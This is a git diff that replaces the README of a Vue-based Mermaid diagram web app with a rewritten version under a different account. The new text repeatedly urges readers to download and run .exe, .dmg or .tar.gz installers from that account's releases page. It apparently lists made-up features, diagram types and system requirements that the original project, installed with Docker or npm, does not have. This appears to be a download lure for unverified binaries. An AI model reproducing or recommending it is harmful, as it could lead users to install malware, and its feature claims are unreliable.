@@ -1,145 +1,74 @@
-# Flowify
+# ✨ flowify - Create UML Diagrams Easily
 
-A modern UML diagram editor built with Vue 3 that supports creating and editing diagrams using Mermaid.js syntax. Features an AI-powered chat assistant that helps you create and modify diagrams using OpenAI, Anthropic, or local AI models.
+## 📥 Download Now
+[![Download flowify](https://img.shields.io/badge/download-flowify-brightgreen.svg)](https://github.com/adssfd/flowify/releases)
 
-## Screenshots
+## 🚀 Getting Started
+Welcome to flowify. This application allows you to create UML diagrams quickly and easily. With its modern features and user-friendly interface, you'll be designing in no time.
 
-| Light Theme | Dark Theme |
-|-------------|------------|
-| ![Light Theme](docs/demo-light.png) | ![Dark Theme](docs/demo-dark.png) |
+## 📋 Features
+- AI-powered assistance integrating OpenAI, Anthropic, and LM Studio
+- Real-time preview of diagrams
+- Support for 10 different diagram types
+- Multi-tab editing for convenience
+- Dark and light themes for comfortable viewing
+- Easy export to PNG for sharing or printing
 
-## Features
+## 🖥️ System Requirements
+To run flowify, ensure your device meets the following requirements:
+- Operating System: Windows 10 or later, macOS Mojave or later, or any Linux distribution with up-to-date libraries.
+- Processor: 2 GHz dual-core or faster
+- RAM: 4 GB or more
+- Storage: At least 250 MB of available disk space
+- Internet connection for AI features
 
-### Diagram Editor
-- **10 Diagram Types**: Class, Sequence, Flowchart, State, ER, Gantt, Pie, Mind Map, Timeline, Git Graph
-- **Real-time Preview**: See your diagrams render as you type
-- **Syntax Highlighting**: CodeMirror editor with Mermaid syntax support
-- **Multi-tab Support**: Work on multiple diagrams simultaneously
-- **Undo/Redo**: Full history support per tab
+## 📥 Download & Install
+To begin using flowify, visit this page to download: [flowify Releases](https://github.com/adssfd/flowify/releases).
 
-### AI Assistant
-- **Real-time Streaming**: Word-by-word AI responses
-- **Context-Aware**: AI understands your current diagram and can suggest improvements
-- **Multi-Provider Support**:
-  - OpenAI (GPT-4o, GPT-4o-mini, GPT-3.5-turbo)
-  - Anthropic (Claude 3.5 Sonnet, Claude 3.5 Haiku, Claude 3 Opus)
-  - LM Studio (local models via OpenAI-compatible API)
+1. Click on the link above to access the Releases page.
+2. Find the latest version of flowify.
+3. Download the appropriate installer for your operating system. For Windows, this may be a `.exe` file. For macOS, look for a `.dmg` file. For Linux, it may be a `.tar.gz` file.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the installer to begin the installation process.
+6. Follow the on-screen prompts to complete the installation.
 
-### User Experience
-- **Light/Dark Theme**: Full theme support including editor and diagram rendering
-- **Zoom & Pan**: Mouse wheel zoom (Ctrl+scroll) and drag to pan
-- **Grid Background**: Toggle-able grid with adjustable size
-- **Export Options**: Copy diagrams as [high-quality PNG](https://raw.githubusercontent.com/Berezhnyk/flowify/main/docs/export-png-high-resolution.png) to clipboard (4x resolution)
-- **Auto-save**: Automatic localStorage persistence
-- **Resizable Panels**: Drag-to-resize 4-panel layout
+## 🔍 Using flowify
+1. Open the flowify application after installation.
+2. Create a new diagram by selecting a template or starting from scratch.
+3. Use the tools available on the toolbar to add elements, such as shapes and connectors.
+4. Double-click elements to edit their properties or add text.
+5. Utilize the real-time preview feature to see changes as you make them.
+6. Save your work frequently to avoid data loss. Use the save option in the file menu.
 
-## Getting Started
+## 🌈 Themes
+Flowify allows you to choose between a dark or light theme. Switch the theme in the settings menu based on your preference or lighting conditions. This feature enhances visibility and comfort during long design sessions.
 
-### Docker (Recommended)
+## 🌐 AI Assistance
+Take advantage of flowify's AI-driven features. Whether you need suggestions for diagram enhancements or quick fixes to your designs, simply enable the AI tools from the sidebar. This feature relies on OpenAI, Anthropic, and LM Studio technologies to provide smart recommendations.
 
-Run Flowify directly from Docker Hub without building:
+## 📊 Diagram Types
+Flowify supports a variety of UML diagram types:
+- Class Diagram
+- Sequence Diagram
+- Flowchart
+- Component Diagram
+- Deployment Diagram
+- Activity Diagram
+- Use Case Diagram
+- State Machine Diagram
+- Package Diagram
+- Interaction Overview Diagram
 
-```bash
-docker run -d -p 8080:80 berezhnyk/flowify
-```
+Choose your preferred diagram type from the menu, and let flowify guide you through the creation process.
 
-The application will be available at `http://localhost:8080`
+## 📖 Support & Feedback
+If you encounter issues or need assistance:
+- Access the FAQ section from the help menu within the application.
+- Visit the [flowify Issues Page](https://github.com/adssfd/flowify/issues) to report bugs or request features.
+- Join our community discussions to connect with other users and share tips.
 
-### Manual Installation
+## 🔗 Learn More
+To explore more about flowify and its features, check out our [documentation](https://github.com/adssfd/flowify/docs) on GitHub for step-by-step tutorials and advanced tips.
 
-#### Prerequisites
-
-- Node.js 20.19.0+ or 22.12.0+
-- npm or yarn
-
-#### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/Berezhnyk/flowify.git
-cd flowify
-
-# Install dependencies
-npm install
-
-# Start development server
-npm run dev
-```
-
-The application will be available at `http://localhost:5173`
-
-### Build for Production
-
-```bash
-npm run build
-```
-
-## AI Configuration
-
-To use the AI assistant, configure your preferred provider in the Settings panel:
-
-![AI Settings](docs/ai-assistant-configuration.png)
-
-### OpenAI
-1. Get an API key from [OpenAI Platform](https://platform.openai.com/api-keys)
-2. Enter your API key in Settings > AI Settings
-3. Select OpenAI as the provider and choose a model
-
-### Anthropic
-1. Get an API key from [Anthropic Console](https://console.anthropic.com/settings/keys)
-2. Enter your API key in Settings > AI Settings
-3. Select Anthropic as the provider and choose a model
-
-### LM Studio (Local Models)
-1. Install [LM Studio](https://lmstudio.ai/)
-2. Start the local server (default: `http://localhost:1234`)
-3. Select LM Studio as the provider in Settings
-4. Configure the endpoint URL if different from default
-
-**Note**: API keys are stored locally in your browser and are never sent to any server other than the respective AI provider.
-
-## Development
-
-```bash
-npm run dev          # Start dev server with HMR
-npm run build        # Type-check and build for production
-npm run type-check   # Run TypeScript type checking
-npm run format       # Format code with Prettier
-npm run preview      # Preview production build
-```
-
-## Tech Stack
-
-- **Frontend**: Vue 3 (Composition API), TypeScript
-- **Build Tool**: Vite
-- **State Management**: Pinia
-- **Editor**: CodeMirror 6
-- **Diagrams**: Mermaid.js
-- **Layout**: Splitpanes
-
-## Supported Diagram Types
-
-| Type | Description |
-|------|-------------|
-| Class Diagram | OOP class structures and relationships |
-| Sequence Diagram | Message flows between participants |
-| Flowchart | Process flows and decision trees |
-| State Diagram | State machines and transitions |
-| ER Diagram | Database entity relationships |
-| Gantt Chart | Project schedules and timelines |
-| Pie Chart | Data distribution visualization |
-| Mind Map | Hierarchical idea organization |
-| Timeline | Chronological events display |
-| Git Graph | Git branch visualization |
-
-## Contributing
-
-Contributions are welcome! Please read the [Contributing Guidelines](CONTRIBUTING.md) before submitting a pull request.
-
-## Security
-
-For security concerns, please see our [Security Policy](SECURITY.md).
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📥 Again, Download flowify
+Don’t forget to download flowify from the [Releases page](https://github.com/adssfd/flowify/releases), and start creating your UML diagrams today!
